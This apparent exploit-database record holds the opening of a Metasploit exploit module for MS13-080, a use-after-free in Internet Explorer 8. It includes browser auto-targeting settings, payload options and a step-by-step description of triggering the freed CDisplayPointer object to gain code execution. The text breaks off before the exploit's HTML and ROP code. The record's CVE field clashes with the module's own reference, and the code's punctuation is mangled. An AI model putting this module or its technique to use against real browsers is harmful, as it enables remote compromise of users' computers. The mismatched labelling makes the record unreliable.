{
    "text": "vul_name : Microsoft Internet Explorer CDisplayPointer Use-After-Free Exploit ， vul_cve : CVE-2013-3893 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # Framework web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = NormalRanking ， include Msf : Exploit : Remote : HttpServer : HTML ， include Msf : Exploit : RopDb ， include Msf : Exploit : Remote : BrowserAutopwn ， autopwn_info ( { ，  : ua_name => HttpClients : IE ,  ，  : ua_minver => \"8.0\" ,  ，  : ua_maxver => \"8.0\" ,  ，  : javascript => true ,  ，  : os_name => OperatingSystems : WINDOWS ,  ，  : rank => NormalRanking ， } )  ， super ( update_info ( info ,  ， 'Name' => \"MS13-080 Microsoft Internet Explorer CDisplayPointer Use-After-Free\" ,  ， 'Description' => %q{ ， This module exploits a vulnerability found in Microsoft Internet Explorer. It was originally ， found being exploited in the wild targeting Japanese and Korean IE8 users on Windows XP ,  ， around the same time frame as CVE-2013-3893 , except this was kept out of the public eye by ， multiple research companies and the vendor until the October patch release. ， This issue is a use-after-free vulnerability in CDisplayPointer via the use of a ， \"onpropertychange\" event handler. To set up the appropriate buggy conditions , we first craft ， the DOM tree in a specific order , where a CBlockElement comes after the CTextArea element. ， If we use a select (  ) function for the CTextArea element , two important things will happen :  ， a CDisplayPointer object will be created for CTextArea , and it will also trigger another ， event called \"onselect\". The \"onselect\" event will allow us to set up for the actual event ， handler we want to abuse - the \"onpropertychange\" event. Since the CBlockElement is a child ， of CTextArea , if we do a node swap of CBlockElement in \"onselect\" , this will trigger ， \"onpropertychange\". During \"onpropertychange\" event handling , a free of the CDisplayPointer ， object can be forced by using an \"Unslect\" ( other approaches also apply )  , but a reference ， of this freed memory will still be kept by CDoc : ScrollPointerIntoView , specifically after ， the CDoc : GetLineInfo call , because it is still trying to use that to update ， CDisplayPointer's position. When this invalid reference arrives in QIClassID , a crash ， finally occurs due to accessing the freed memory. By controlling this freed memory , it is ， possible to achieve arbitrary code execution under the context of the user. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Unknown' ,  # Exploit in the wild ， 'sinn3r' # Metasploit ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2013-3897' ]  ,  ，  [ 'OSVDB' , '98207' ]  ,  ，  [ 'MSB' , 'MS13-080' ]  ,  ，  [ 'URL' , ' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Platform' => 'win' ,  ， 'Targets' => ，  [  ，  [ 'Automatic' , {} ]  ,  ，  [ 'IE 8 on Windows XP SP3' , {} ]  ,  ，  [ 'IE 8 on Windows 7' , {} ]  ，  ]  ,  ， 'Payload' => ， { ， 'BadChars' => \"\\x00\" ,  ， 'PrependEncoder' => \"\\x81\\xc4\\x0c\\xfe\\xff\\xff\" # add esp , -500 ， } ,  ， 'DefaultOptions' => ， { ， 'InitialAutoRunScript' => 'migrate -f' ， } ,  ， 'Privileged' => false ,  ，  # Jsunpack first received a sample to analyze on Sep 12 2013. ，  # MSFT patched this on Oct 8th. ， 'DisclosureDate' => \"Oct 08 2013\" ,  ， 'DefaultTarget' => 0 )  ， end ， def get_check_html",
    "time": "2013.10.15"
}